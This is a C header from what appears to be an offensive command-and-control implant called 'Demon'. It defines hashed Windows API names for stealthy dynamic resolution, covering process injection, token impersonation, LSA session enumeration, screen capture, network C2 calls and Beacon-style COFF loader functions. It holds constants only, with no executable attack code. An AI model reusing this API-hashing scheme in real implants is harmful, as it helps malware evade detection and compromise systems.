#ifndef DEMON_STRINGS_H
#define DEMON_STRINGS_H

#define PROCESS_ARCH_UNKNOWN				0
#define PROCESS_ARCH_X86					1
#define PROCESS_ARCH_X64					2
#define PROCESS_ARCH_IA64					3

#ifdef _WIN64
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X64
#else
#define PROCESS_AGENT_ARCH PROCESS_ARCH_X86
#endif

// Hashes for the dynamic winapi loading via a hashing algorithm
#define FuncHash_LdrGetProcedureAddress              0x2e5a99f6
#define FuncHash_LdrLoadDll                          0x0307db23
#define FuncHash_RtlAllocateHeap                     0xc0b381da
#define FuncHash_RtlReAllocateHeap                   0xc0b381da
#define FuncHash_RtlFreeHeap                         0x70ba71d7
#define FuncHash_RtlExitUserThread                   0x8e492b88
#define FuncHash_RtlExitUserProcess                  0x3aa1f0ef
#define FuncHash_RtlRandomEx                         0x7c3439f5
#define FuncHash_RtlNtStatusToDosError               0x35abf270
#define FuncHash_RtlGetVersion                       0x3ca3aa1d
#define FuncHash_RtlCreateTimerQueue                 0xf78fb211
#define FuncHash_RtlCreateTimer                      0xa5de7c4c
#define FuncHash_RtlDeleteTimerQueue                 0x9561fe90
#define FuncHash_RtlCaptureContext                   0x7733eed0
#define FuncHash_RtlAddVectoredExceptionHandler      0x554bafa9
#define FuncHash_RtlRemoveVectoredExceptionHandler   0x880c210e
#define FuncHash_CreateThread                        0x7f08f451
#define FuncHash_NtClose                             0x8b8e133d
#define FuncHash_NtCreateEvent                       0xca58747d
#define FuncHash_NtSetEvent                          0x4514bd95
#define FuncHash_VirtualProtectEx                    0xd812922a
#define FuncHash_VirtualProtect                      0x844ff18d
#define FuncHash_LocalAlloc                          0x73cebc5b
#define FuncHash_LocalReAlloc                        0xabad9db2
#define FuncHash_LocalFree                           0xa66df372
#define FuncHash_CreateRemoteThread                  0xaa30775d
#define FuncHash_CreateToolhelp32Snapshot            0x66851295
#define FuncHash_Process32FirstW                     0xe18fc6e8
#define FuncHash_Process32NextW                      0x9307647f
#define FuncHash_CreatePipe                          0x9a8deee7
#define FuncHash_CreateProcessA                      0xaeb52e19
#define FuncHash_CreateFileW                         0xeb96c610
#define FuncHash_GetFullPathNameW                    0x3524e9fd
#define FuncHash_GetFileSize                         0x7891c520
#define FuncHash_CreateNamedPipeW                    0x28fe1c03
#define FuncHash_ConvertFiberToThread                0x1f194e49
#define FuncHash_CreateFiberEx                       0x2bac113e
#define FuncHash_ReadFile                            0x71019921
#define FuncHash_VirtualAllocEx                      0xf36e5ab4
#define FuncHash_WaitForSingleObjectEx               0x56bd0197
#define FuncHash_ResumeThread                        0x74162a6e
#define FuncHash_OpenThread                          0x806cb78f
#define FuncHash_Thread32Next                        0x695209e1
#define FuncHash_Thread32First                       0x93049a4a
#define FuncHash_GetComputerNameExA                  0xd252a5f3
#define FuncHash_ExitProcess                         0xb769339e
#define FuncHash_GetExitCodeProcess                  0xe21026f9
#define FuncHash_GetExitCodeThread                   0xb263c852
#define FuncHash_TerminateProcess                    0x60af076d
#define FuncHash_GetTickCount                        0x41ad16b9
#define FuncHash_ReadProcessMemory                   0xb8932459
#define FuncHash_ConvertThreadToFiberEx              0xac22a286
#define FuncHash_SwitchToFiber                       0xc2d09e02
#define FuncHash_DeleteFiber                         0x1cd85cc0
#define FuncHash_GetThreadContext                    0xeba2cfc2
#define FuncHash_SetThreadContext                    0x7e20964e
#define FuncHash_AllocConsole                        0xcddb7fc3
#define FuncHash_FreeConsole                         0x8afb8c5a
#define FuncHash_GetConsoleWindow                    0xe1db2410
#define FuncHash_GetStdHandle                        0xf178843c
#define FuncHash_SetStdHandle                        0x3ce0e4c8
#define FuncHash_WaitNamedPipeW                      0x085741c4
#define FuncHash_PeekNamedPipe                       0x94f08b9d
#define FuncHash_DisconnectNamedPipe                 0x55668f42
#define FuncHash_WriteFile                           0x663cecb0
#define FuncHash_ConnectNamedPipe                    0xc003c602
#define FuncHash_FreeLibrary                         0x30eece3c
#define FuncHash_GetCurrentDirectoryW                0x2ced73f4
#define FuncHash_GetFileAttributesW                  0xcc9c6ce3
#define FuncHash_FindFirstFileW                      0xae2636e5
#define FuncHash_FindNextFileW                       0xf3b43c5c
#define FuncHash_FindClose                           0xb4e7451c
#define FuncHash_FileTimeToSystemTime                0x1fb7928b
#define FuncHash_SystemTimeToTzSpecificLocalTime     0x99a3156a
#define FuncHash_RemoveDirectoryW                    0x4192723f
#define FuncHash_DeleteFileW                         0x1cd8872f
#define FuncHash_CreateDirectoryW                    0x41fac005
#define FuncHash_CopyFileW                           0xac2253d7
#define FuncHash_InitializeProcThreadAttributeList   0x5ca2ca33
#define FuncHash_UpdateProcThreadAttribute           0x09c91a68
#define FuncHash_SetCurrentDirectoryW                0xbec3a080
#define FuncHash_Wow64DisableWow64FsRedirection      0xd859b1d8
#define FuncHash_Wow64RevertWow64FsRedirection       0x72f47e1c
#define FuncHash_GetModuleHandleA                    0x5a153f58
#define FuncHash_GetSystemTimeAsFileTime             0x4bbf083c
#define FuncHash_GetLocalTime                        0x12d7e0df
#define FuncHash_DuplicateHandle                     0xee96b40c
#define FuncHash_NtOpenProcess                       0x5003c058
#define FuncHash_NtQueryInformationProcess           0xd034fc62
#define FuncHash_NtQuerySystemInformation            0xee4f73a8
#define FuncHash_NtAllocateVirtualMemory             0x6793c34c
#define FuncHash_NtQueueApcThread                    0xd4612238
#define FuncHash_NtOpenThread                        0xfb8a31d1
#define FuncHash_NtResumeThread                      0x2c7b3d30
#define FuncHash_NtSuspendThread                     0x50febd61
#define FuncHash_NtCreateEvent                       0xca58747d
#define FuncHash_NtDuplicateObject                   0x2388ee19
#define FuncHash_NtGetContextThread                  0x9e0e1a44
#define FuncHash_NtSetContextThread                  0x308be0d0
#define FuncHash_NtWaitForSingleObject               0x4c6dc63c
#define FuncHash_NtAlertResumeThread                 0x482e8408
#define FuncHash_NtSignalAndWaitForSingleObject      0x7bdd15cd
#define FuncHash_NtTestAlert                         0x7915b7df
#define FuncHash_NtCreateThreadEx                    0xcb0c2130
#define FuncHash_NtOpenProcessToken                  0x7bd07459
#define FuncHash_NtDuplicateToken                    0x3000ecc3
#define FuncHash_NtProtectVirtualMemory              0x082962c8
#define FuncHash_NtTerminateThread                   0xac3c9dc8
#define FuncHash_NtWriteVirtualMemory                0x95f3a792
#define FuncHash_NtContinue                          0x780a612c
#define FuncHash_NtReadVirtualMemory                 0xc24062e3
#define FuncHash_NtFreeVirtualMemory                 0x471aa7e9
#define FuncHash_NtQueryVirtualMemory                0xe39d8e5d
#define FuncHash_NtQueryInformationToken             0x2ce5a244
#define FuncHash_NtQueryObject                       0x218116f4
#define FuncHash_NtQueryInformationThread            0xc91f149b
#define FuncHash_GetTokenInformation                 881854923972837164
#define FuncHash_CreateProcessWithTokenW             0x94e76e4c
#define FuncHash_CreateProcessWithLogonW             0x823c224a
#define FuncHash_RevertToSelf                        14100625964972061354
#define FuncHash_GetUserNameA                        13544547492196232006
#define FuncHash_LogonUserA                          0x609d56e4
#define FuncHash_LookupPrivilegeValueA               0xbbae6e84
#define FuncHash_LookupAccountSidA                   3739427023317208365
#define FuncHash_OpenThreadToken                     579177116578842096
#define FuncHash_OpenProcessToken                    0xc57bd097
#define FuncHash_ImpersonateLoggedOnUser             0xa6ffd55a
#define FuncHash_AdjustTokenPrivileges               0xce4cd9cb
#define FuncHash_LookupPrivilegeNameA                0xe6176fe8
#define FuncHash_SystemFunction032                   0xcccf3585
#define FuncHash_FreeSid                             0x2174ce07
#define FuncHash_SetSecurityDescriptorSacl           0x4a8307ab
#define FuncHash_SetSecurityDescriptorDacl           0x4a7acdfc
#define FuncHash_InitializeSecurityDescriptor        0x70670cee
#define FuncHash_AddMandatoryAce                     0x248cc186
#define FuncHash_InitializeAcl                       0x62cac4c7
#define FuncHash_AllocateAndInitializeSid            0x57a4ccf
#define FuncHash_CheckTokenMembership                0xfeda76f0
#define FuncHash_SetEntriesInAclW                    0xe2d6b8e9
#define FuncHash_SetThreadToken                      0x575b17ca
#define FuncHash_SafeArrayAccessData                 2675336209888825647
#define FuncHash_SafeArrayUnaccessData               18329906161741280562
#define FuncHash_SafeArrayCreate                     3571287155138900375
#define FuncHash_SafeArrayPutElement                 2676058380407465830
#define FuncHash_SafeArrayCreateVector               17426458116918762890
#define FuncHash_SafeArrayDestroy                    7172011678126394509
#define FuncHash_SysAllocString                      3847978704220612774
#define FuncHash_CommandLineToArgvW                  0x8d607276
#define FuncHash_vsnprintf                           0xe61d840f
#define FuncHash_ShowWindow                          8245429827274884638
#define FuncHash_GetSystemMetrics                    0xa988c1a1
#define FuncHash_GetDC                               0xd3d24ac
#define FuncHash_ReleaseDC                           0xe43871cd
#define FuncHash_GetCurrentObject                    0xd41e47df
#define FuncHash_GetObjectW                          0x512b413
#define FuncHash_CreateCompatibleDC                  0xa05cbae0
#define FuncHash_CreateDIBSection                    0xfff5b73d
#define FuncHash_SelectObject                        0x7cf4fd7c
#define FuncHash_BitBlt                              0xa9804e46
#define FuncHash_DeleteObject                        0xcc68186f
#define FuncHash_DeleteDC                            0x9f3bef5f
#define FuncHash_SetProcessValidCallTargets          0xbb6970d6
#define FuncHash_WinHttpOpen                         0x5e4f39e5
#define FuncHash_WinHttpConnect                      0x7242c17d
#define FuncHash_WinHttpOpenRequest                  0xeab7b9ce
#define FuncHash_WinHttpSetOption                    0xa18b94f8
#define FuncHash_WinHttpCloseHandle                  0x36220cd5
#define FuncHash_WinHttpSendRequest                  0xb183faa6
#define FuncHash_WinHttpAddRequestHeaders            0xed7fcb41
#define FuncHash_WinHttpReceiveResponse              0x146c4925
#define FuncHash_WinHttpWebSocketCompleteUpgrade     0x58929db
#define FuncHash_WinHttpQueryDataAvailable           0x34cb8684
#define FuncHash_WinHttpReadData                     0x7195e4e9
#define FuncHash_WinHttpQueryHeaders                 0x389cefa5
#define FuncHash_CLRCreateInstance                   10918823944048432655
#define FuncHash_GetAdaptersInfo                     0xbc950fc5
#define FuncHash_NetLocalGroupEnum                   0x2c3fa6b9
#define FuncHash_NetGroupEnum                        0xb278fc6e
#define FuncHash_NetUserEnum                         0xe84c1c20
#define FuncHash_NetWkstaUserEnum                    0x3f45a8a
#define FuncHash_NetSessionEnum                      0x80edcd45
#define FuncHash_NetShareEnum                        0xb0461db4
#define FuncHash_NetApiBufferFree                    0x83e6be2
#define FuncHash_WSAStartup                          0x6128c683
#define FuncHash_WSACleanup                          0x7f1aab78
#define FuncHash_WSASocketA                          0x559f159a
#define FuncHash_ioctlsocket                         0x6dcd609
#define FuncHash_bind                                0x7c9499e2
#define FuncHash_listen                              0xb794014
#define FuncHash_accept                              0xf15ae9b5
#define FuncHash_closesocket                         0x494cb104
#define FuncHash_recv                                0x7c9d4d95
#define FuncHash_send                                0x7c9ddb4f
#define FuncHash_connect                             0xd3764dcf
#define FuncHash_getaddrinfo                         0x7c84cdcc
#define FuncHash_LsaConnectUntrusted                 0xb851157d
#define FuncHash_LsaRegisterLogonProcess             0x5e8f9888
#define FuncHash_LsaNtStatusToWinError               0x99301546
#define FuncHash_EqualSid                            0x3be9fe3d
#define FuncHash_ConvertSidToStringSidW              0x99a22dd7
#define FuncHash_LsaLookupAuthenticationPackage      0xf0fc4b4b
#define FuncHash_LsaDeregisterLogonProcess           0x23961991
#define FuncHash_LsaFreeReturnBuffer                 0x528ffd01
#define FuncHash_LsaCallAuthenticationPackage        0xabc4bb2d
#define FuncHash_LsaGetLogonSessionData              0x417c2162
#define FuncHash_LsaEnumerateLogonSessions           0x9f1343e1

//#define FuncHash_GetTokenInformation        881854923972837164
//#define FuncHash_CreatePipe                 8244700854143020775
//#define FuncHash_ReadFile                   7571513842702625
//#define FuncHash_RevertToSelf               14100625964972061354
//#define FuncHash_Sleep                      210689975806
//#define FuncHash_TerminateProcess           3268205303374481261
//#define FuncHash_GetUserNameA               13544547492196232006
//#define FuncHash_ExitProcess                13824059171100242846
//#define FuncHash_RtlGetVersion              4893460183577242141
//#define FuncHash_RtlCreateUserThread        1016696724611196162
//#define FuncHash_ResumeThread               14100509000585325166
//#define FuncHash_OpenThread                 8245254994680133519
//#define FuncHash_Thread32Next               14206118522476693985
//#define FuncHash_Thread32First              7633309398982761034
//#define FuncHash_VirtualProtectEx           5341311935265804842
//#define FuncHash_LookupAccountSidA          3739427023317208365
//#define FuncHash_InitializeProcThreadAttributeList 6595998938373999155
//#define FuncHash_UpdateProcThreadAttribute  6332977549253614184

// Beacon API
#define COFFAPI_BEACONDATAPARSER                0xe2494ba2
#define COFFAPI_BEACONDATAINT                   0xaf1afdd2
#define COFFAPI_BEACONDATASHORT                 0xe2835ef7
#define COFFAPI_BEACONDATALENGTH                0x22641d29
#define COFFAPI_BEACONDATAEXTRACT               0x80d46722

#define COFFAPI_BEACONFORMATALLOC               0x4caae0e1
#define COFFAPI_BEACONFORMATRESET               0x4ddac759
#define COFFAPI_BEACONFORMATFREE                0x7e749f38
#define COFFAPI_BEACONFORMATAPPEND              0xe25167ce
#define COFFAPI_BEACONFORMATPRINTF              0x56f4aa9
#define COFFAPI_BEACONFORMATTOSTRING            0xb59f4df0
#define COFFAPI_BEACONFORMATINT                 0x3a229cc1

#define COFFAPI_BEACONPRINTF                    0x700d8660
#define COFFAPI_BEACONOUTPUT                    0x6df4b81e
#define COFFAPI_BEACONUSETOKEN                  0x889e48bb
#define COFFAPI_BEACONREVERTTOKEN               0xf2744ba6
#define COFFAPI_BEACONISADMIN                   0x566264d2
#define COFFAPI_BEACONGETSPAWNTO                0x1e7c9fb9
#define COFFAPI_BEACONSPAWNTEMPORARYPROCESS     0xd6c57438
#define COFFAPI_BEACONINJECTPROCESS             0xea75b09
#define COFFAPI_BEACONINJECTTEMPORARYPROCESS    0x9e22498c
#define COFFAPI_BEACONCLEANUPPROCESS            0xcee62b74

#define COFFAPI_TOWIDECHAR                      0x59fcf3cf
#define COFFAPI_LOADLIBRARYA                    0x5fbff0fb
#define COFFAPI_GETPROCADDRESS                  0xcf31bb1f
#define COFFAPI_GETMODULEHANDLE                 0x5a153f58
#define COFFAPI_FREELIBRARY                     0x30eece3c
#define COFFAPI_LOCALFREE                       0xa66df372

#define HASH_KERNEL32                           0xadd31df0
#define HASH_NTDLL                              0x70e61753

#endif
